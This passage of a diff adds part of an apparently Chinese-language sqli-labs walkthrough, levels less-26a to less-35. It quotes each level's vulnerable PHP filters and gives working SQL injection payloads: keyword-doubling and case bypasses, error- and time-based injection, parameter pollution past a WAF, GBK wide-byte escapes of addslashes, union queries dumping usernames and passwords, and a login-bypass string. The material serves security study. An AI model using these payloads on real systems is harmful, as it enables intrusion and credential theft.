class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<hr>
+<h2 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p>
+<p>关键词：盲注、布尔注入、延时注入</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>?id=<span class="hljs-number">1</span><br>?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span><br># 返回结果相同，成功闭合SQL语句<br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p>
+<p>关键词：基于错误、过滤 Union 和 Select</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br># 测试能否闭合<br>?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span><br>?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>sleep(<span class="hljs-number">3</span>)%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure>
+<ul>
+<li>过滤 Union 和 select：采用双写绕过（原理同 or 和 and）、采用大小写混合绕过（MySQL对大小写并不敏感）<br>关键代码：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment"># 过滤了 /*</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><span class="hljs-comment"># 过滤了 -</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><span class="hljs-comment"># 过滤了 #</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><span class="hljs-comment"># 过滤了空格</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><span class="hljs-comment"># 过滤了 select /m 严格模式 不可以使用双写绕过</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/select/m&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br>$id= preg_replace(<span class="hljs-string">&#x27;/select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br>$id= preg_replace(<span class="hljs-string">&#x27;/Select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br>$id= preg_replace(<span class="hljs-string">&#x27;/SELECT/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><br><br><span class="hljs-comment"># 过滤了 union UNION</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br>$id= preg_replace(<span class="hljs-string">&#x27;/Union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br>$id= preg_replace(<span class="hljs-string">&#x27;/UNION/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><span class="hljs-keyword">return</span> $id;<br><br></code></pre></td></tr></table></figure>
+进行报错注入（类似 less-26）<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br># 报错注入 Payload<br>?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, database()))%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span><br>?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, seleselectct database()))%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<hr>
+<h2 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h2><p>闭合方式：<code>id=&quot;$id&quot;</code></p>
+<p>同 less-27，闭合方式不同。没有输出报错信息，所以不能报错注入。关键代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>$id = <span class="hljs-string">&#x27;&quot;&#x27;</span> .$id. <span class="hljs-string">&#x27;&quot;&#x27;</span>;<br>$sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span> LIMIT 0,1&quot;</span>;<br><br></code></pre></td></tr></table></figure>
+<p>尝试注入</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><br><span class="hljs-comment"># 测试闭合情况</span><br>?id=<span class="hljs-number">1</span>%26%261<br><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&quot;%26%26sleep(3)%26%26&quot;</span><span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure>
+
+<h2 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code> </p>
+<p>关键词：基于错误、过滤 Union 和 Select、单引号+括号<br>关键代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment"># 过滤 /*</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><br><br><span class="hljs-comment"># 过滤 - # 注释</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br>$id= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><br><br><span class="hljs-comment"># 过滤 空格 +</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);.<br><br><br><span class="hljs-comment"># 过滤 union select /i 大小写都过滤</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/union\s+select/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><span class="hljs-keyword">return</span> $id;<br><br></code></pre></td></tr></table></figure>
+
+<p>过滤 union select /i 大小写都过滤：只能采用双写的方式进行注入</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br># 测试SQL语句是否执行<br> ?id=<span class="hljs-number">1</span>&#x27;)%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>sleep(<span class="hljs-number">3</span>)%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>(&#x27;<span class="hljs-number">1</span><br><br># 延时注入Payload<br>?id=<span class="hljs-number">1</span>&#x27;)%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>if(database()=&#x27;security&#x27;, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>)%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>(&#x27;<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-28a"><a href="#less-28a" class="headerlink" title="less-28a"></a>less-28a</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p>
+<p>关键代码：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-keyword">function</span> blacklist(<span class="hljs-variable">$id</span>)<br>&#123;<br><span class="hljs-regexp">//</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>); <span class="hljs-regexp">//</span>strip out /*<br><span class="hljs-regexp">//</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>); <span class="hljs-regexp">//</span>Strip out --.<br><span class="hljs-regexp">//</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>); <span class="hljs-regexp">//</span>Strip out <span class="hljs-comment">#.</span><br><span class="hljs-regexp">//</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>); <span class="hljs-regexp">//</span>Strip out spaces.<br><span class="hljs-regexp">//</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/select/m&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>); <span class="hljs-regexp">//</span>Strip out spaces.<br><span class="hljs-regexp">//</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>); <span class="hljs-regexp">//</span>Strip out spaces.<br><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/union\s+select/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>); <span class="hljs-regexp">//</span>Strip out spaces.<br>return <span class="hljs-variable">$id</span>;<br>&#125;<br><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;</span>;<br><br></code></pre></td></tr></table></figure>
+
+<p>测试 Payload：</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><br><span class="hljs-comment"># 闭合 SQL</span><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 联合注入 Payload（国光大佬的 payload 测试失败）</span><br><span class="hljs-string">?id=0&#x27;</span>) <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1, 2, 3--+</span><br><br></code></pre></td></tr></table></figure>
+
+<h2 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p>
+<p>关键词：GET、基于错误、WAF</p>
+<p>index.php 关键代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>$sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-keyword">if</span> 有结果：<br>    输出<br><span class="hljs-keyword">else</span>：<br>    输出报错信息<br><br></code></pre></td></tr></table></figure>
+<p>第一题太简单了吧，联合注入 Payload</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>?id=<span class="hljs-number">0</span>&#x27; union select <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>--+<br><br></code></pre></td></tr></table></figure>
+
+<p>login.php 关键代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">// 获取查询的字符串</span><br>$qs = $_SERVER[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><br><span class="hljs-comment">// 模拟Tomcat进行中间过滤</span><br>$id1=java_implimentation($qs);<br>$id=$_GET[<span class="hljs-string">&#x27;id&#x27;</span>]<br><br><span class="hljs-comment">// 白名单</span><br>whitelist($id1);<br><br><span class="hljs-comment">// SQL语句</span><br>$sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><br><span class="hljs-comment">// WAF</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">whitelist</span>(<span class="hljs-params">$input</span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 检测数字 以数字开头，以数字结尾</span><br>    $match = preg_match(<span class="hljs-string">&quot;/^\d+$/&quot;</span>, $input);<br>    <span class="hljs-keyword">if</span>($match)<br>    &#123;<br>        <span class="hljs-comment">//echo &quot;you are good&quot;;</span><br>        <span class="hljs-comment">//return $match;</span><br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;    <br>        header(<span class="hljs-string">&#x27;Location: hacked.php&#x27;</span>);<br>        <span class="hljs-comment">//echo &quot;you are bad&quot;;</span><br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">// 限制id的长度</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">java_implimentation</span>(<span class="hljs-params">$query_string</span>)</span><br><span class="hljs-function"></span>&#123;<br>    $q_s = $query_string;<br>    $qs_array= explode(<span class="hljs-string">&quot;&amp;&quot;</span>,$q_s);<br><br><br>    <span class="hljs-keyword">foreach</span>($qs_array <span class="hljs-keyword">as</span> $key =&gt; $value)<br>    &#123;<br>        $val=substr($value,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">if</span>($val==<span class="hljs-string">&quot;id&quot;</span>)<br>        &#123;<br>            $id_value=substr($value,<span class="hljs-number">3</span>,<span class="hljs-number">30</span>); <br>            <span class="hljs-keyword">return</span> $id_value;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>同时传入两个 id，当前一个 id 被 java_implimentation 捕获的时候（模拟 Tomcat 的解析），第一个 id 就会进入 WAF，如果检测合格则将 GET 参数中的 id 插入 SQL 语句（第二个 id，而不是进入 WAF的 id）。最后的 payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>?id=1&amp;id=-2&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(username,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+<span class="hljs-keyword">users</span>)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure>
+<ul>
+<li>Apache PHP 会解析最后一个参数</li>
+<li>Tomcat JSP 会解析第一个参数</li>
+</ul>
+<hr>
+<h2 id="less-30-1"><a href="#less-30-1" class="headerlink" title="less-30"></a>less-30</h2><p>闭合方式：<code>id=&quot;$id&quot;</code></p>
+<p>同第29题，仅闭合方式不同。</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><br><span class="hljs-comment"># 简单测试一下</span><br>?id=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">2</span><span class="hljs-string">&quot; and sleep(3) --+</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 联合注入</span><br><span class="hljs-string">?id=1&amp;id=0&quot;</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,(<span class="hljs-title">SELECT</span>+<span class="hljs-title">GROUP_CONCAT</span>(<span class="hljs-title">username</span>,<span class="hljs-title">password</span>+<span class="hljs-title">SEPARATOR</span>+0<span class="hljs-title">x3c62723e</span>)+<span class="hljs-title">FROM</span>+<span class="hljs-title">users</span>)--+</span><br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h2><p>闭合方式：<code>id=（&quot;$id&quot;）</code></p>
+<p>同29题，仅拼接方式不同。</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><br><span class="hljs-comment"># unino注入</span><br><span class="hljs-string">?id=1&amp;id=0&quot;)</span> <span class="hljs-string">union</span> <span class="hljs-string">select</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-number">2</span><span class="hljs-string">,</span> <span class="hljs-number">3</span><span class="hljs-string">--+</span><br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h2><p>闭合方式：<code>id=&quot;$id&quot;</code></p>
+<p>关键词：GET、联合注入、报错注入、布尔盲注、延时注入、绕过addslashes</p>
+<p>关键代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;id&#x27;</span>]))<br>$id=check_addslashes($_GET[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><br><span class="hljs-comment"># 在&#x27; &quot; \ 等敏感字符前面添加反斜杠</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params">$string</span>)</span><br><span class="hljs-function"></span>&#123;    <span class="hljs-comment"># \ 转换为 \\</span><br>    $string = preg_replace(<span class="hljs-string">&#x27;/&#x27;</span>. preg_quote(<span class="hljs-string">&#x27;\\&#x27;</span>) .<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&quot;\\\\\\&quot;</span>, $string); <br>     <span class="hljs-comment"># 将 &#x27; 转为\&quot;</span><br>    $string = preg_replace(<span class="hljs-string">&#x27;/\&#x27;/i&#x27;</span>, <span class="hljs-string">&#x27;\\\&#x27;&#x27;</span>, $string);   <br>     <span class="hljs-comment"># 将 &quot; 转为\&quot;</span><br>    $string = preg_replace(<span class="hljs-string">&#x27;/\&quot;/&#x27;</span>, <span class="hljs-string">&quot;\\\&quot;&quot;</span>, $string);                                <br>    <span class="hljs-keyword">return</span> $string;<br>&#125;<br><br>mysqli_query($con1, <span class="hljs-string">&quot;SET NAMES gbk&quot;</span>);<br>$sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><br></code></pre></td></tr></table></figure>
+
+<p>宽字节注入原理：</p>
+<ul>
+<li>%df吃掉%5c：&#39; 进行url编码后为%5c%27，在%5c%27前添加%df，当MySQL的编码为GBK时（mysqli_query($con1, “SET NAMES gbk”);），%df%5c会被作为一个汉字，%27作为单引号独立，就可以逃脱%5c（\）的限制。</li>
+<li>%5c吃掉%5c：将反斜杠作为字符，然后让%27（’）不受前面的%5c限制。（这里无法使用%5c）</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># 简单测试</span><br>?id=1%df&#x27; and sleep(3)<span class="hljs-comment">--+</span><br><span class="hljs-comment"># 有明显延时</span><br>?id=1%5c&#x27; and sleep(3)<span class="hljs-comment">--+</span><br><span class="hljs-comment"># 没有延时</span><br><br><span class="hljs-comment"># union注入</span><br>?id=-1%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(username,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+<span class="hljs-keyword">users</span>)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h2><p>闭合方式：<code>id=&#39;$id&#39;</code><br>关键词：绕过 addslashes</p>
+<p>类似上一题，不过采用 addslashes 函数添加反斜杠，Payload 同上一题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params">$string</span>)</span><br><span class="hljs-function"></span>&#123;<br>    $string= addslashes($string);    <br>    <span class="hljs-keyword">return</span> $string;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p>addslashes函数转义的字符</p>
+<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs latex"><br><span class="hljs-tag">\<span class="hljs-name"> </span>  =</span>&gt;  <span class="hljs-tag">\<span class="hljs-name">\</span></span><br>&#x27;   =&gt;  <span class="hljs-tag">\<span class="hljs-name">&#x27;</span></span><br>&quot;   =&gt;  <span class="hljs-tag">\<span class="hljs-name">&quot;</span></span><br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h2><p>闭合方式：<code>username=&#39;$uname&#39;</code></p>
+<p>过滤方法同 less-33</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>$uname = addslashes($uname1);<br>$passwd= addslashes($passwd1);<br><br></code></pre></td></tr></table></figure>
+<p>尝试注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># union注入</span><br>uname=admin%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">GROUP_CONCAT</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=233</span><br><br></code></pre></td></tr></table></figure>
+<p>还可以使用 UTF-16 或 UTF-32，效果同<code>%df</code></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh"><br>~ » <span class="hljs-built_in">echo</span> \<span class="hljs-string">&#x27; | iconv -f utf-8 -t utf-16</span><br><span class="hljs-string">��&#x27;</span><br>-------------------------------------------------------------<br>~ » <span class="hljs-built_in">echo</span> \<span class="hljs-string">&#x27; | iconv -f utf-8 -t utf-32</span><br><span class="hljs-string">��&#x27;</span><br><br></code></pre></td></tr></table></figure>
+<p>构造万能密码</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><br>uname=�&#x27; or 1<span class="hljs-comment">#&amp;passwd=</span><br><br></code></pre></td></tr></table></figure>
+<p>在 MySQL 中执行的 SQL 语句</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>SELECT username, password <span class="hljs-keyword">FROM</span><span class="hljs-built_in"> users </span>WHERE <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;�&#x27;</span> <span class="hljs-keyword">or</span> 1#<span class="hljs-keyword">and</span> <span class="hljs-attribute">password</span>=<span class="hljs-string">&#x27;$passwd&#x27;</span> LIMIT 0,1<br><br></code></pre></td></tr></table></figure>
+<p>这个符号的效果类似于 %df，进行联合注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>uname=�&#x27; and 1=2 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">GROUP_CONCAT</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=</span><br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h2><p>闭合方式：<code>id=$id</code></p>
+<p>这个关卡不需要使用单引号即可进行注入</p>
